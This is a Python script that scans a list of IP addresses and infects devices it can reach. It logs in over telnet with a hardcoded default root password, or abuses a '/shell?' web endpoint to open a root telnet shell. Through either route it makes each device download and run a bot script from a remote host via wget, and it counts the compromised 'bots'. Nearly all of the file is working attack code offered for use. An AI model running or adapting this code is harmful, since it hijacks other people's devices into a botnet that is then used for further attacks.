# -*- coding: utf-8 -*-

import requests
import telnetlib
import time
import string
import argparse

# Commands that used to download binarie files when get shell of the device.
commandList = ['cd /tmp', 
			   'wget http://x.x.x.x:8080/getbinaries.sh',
			   'chmod 777 getbinaries.sh',
			   './getbinaries.sh']
exceptList = [r"# ", r"\$ "]

username = "root"
password = "juantech"

SUCCESS = 0
FAILURE_1 = 1
FAILURE_2 = 2

def getshell(iplist, result):
	rf = open(iplist)
	wf = open(result, 'a')
	ips = rf.readlines()
	ip_num = 0
	bot_num = 0

	for ip in ips:
		ip_num = ip_num + 1
		host = ip.strip()
		print 'Now ip_num: ' + str(ip_num) + '. IP address: ' + host
		print 'Begin to try weak password...'

		weakpwd_result = weakpwd(host)
		if weakpwd_result == SUCCESS:
			bot_num = bot_num + 1
			print 'Now bot_num: ' + str(bot_num)
			wf.write(host + ' ' + 'weakpwd' + '\n')
			continue
		elif weakpwd_result == FAILURE_2:
			continue
		else:
			print 'Begin to try internal webshell...'

		webshell_result = webshell(host)
		if webshell_result == SUCCESS:
			bot_num = bot_num + 1
			print 'Now bot_num: ' + str(bot_num)
			wf.write(host + ' ' + 'webshell' + '\n')

	print 'Finish.'
	rf.close()
	wf.close()

# try telnet(port 23) with weak password
def weakpwd(host):
	try:
		tn = telnetlib.Telnet(host, timeout=5)
	except:
		print 'Telnet failure.'
		return FAILURE_1

	try:
		tn.read_until("login: ", timeout=5)
		tn.write(username + '\n')
		tn.read_until("Password: ", timeout=5)
		tn.write(password + '\n')
		telnet_result = tn.expect(exceptList, timeout=5)
		if telnet_result[0] == 0 or telnet_result[0] == 1:
			print 'Get shell with weak password!'
		else:
			print 'Login failure. (wrong password)'
			tn.close()
			return FAILURE_1
	except:
		print 'Login failure. (telnet error)'
		tn.close()
		return FAILURE_1

	try:
		for command in commandList:
			tn.write(command + '\n')
			rev_buf = tn.expect(exceptList, timeout=60)
			print rev_buf
			if rev_buf[0] == -1:
				print 'Execute failure. Try next.'
				tn.close()
				return FAILURE_2
		print 'Success! Bot program had been downloaded!'
		tn.close()
		return SUCCESS
	except:
		print 'Execute failure. Try next.'
		tn.close()
		return FAILURE_2

# try telnet(port 25) through internal webshell
def webshell(host):
	url = 'http://' + host + '/shell?/usr/sbin/telnetd -l /bin/sh -p 25'
	try:
		r = requests.get(url=url, timeout=5)
	except:
		print 'Binding telnet port failure.'
		return FAILURE_1
	
	if r.status_code == 200:
		try:
			tn = telnetlib.Telnet(host, port=25, timeout=5)
		except:
			print 'Telnet failure.'
			return FAILURE_1
	else :
		print 'Binding telnet port failure.'
		return FAILURE_1
		
	try:
		tn.expect(exceptList, timeout=5)
		for command in commandList:
			tn.write(command + '\n')
			rev_buf = tn.expect(exceptList, timeout=60)
			print rev_buf
			if rev_buf[0] == -1:
				print 'Execute failure. Try next.'
				tn.close()
				return FAILURE_2
		print 'Success! Bot program had been downloaded!'
		tn.close()
		return SUCCESS
	except:
		print 'Execute failure. Try next.'
		tn.close()
		return FAILURE_2

if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument('iplist', help='device IP list', type=str)
	parser.add_argument('result', help='vulnerable devices', type=str)
	args = parser.parse_args()
	getshell(**vars(args))
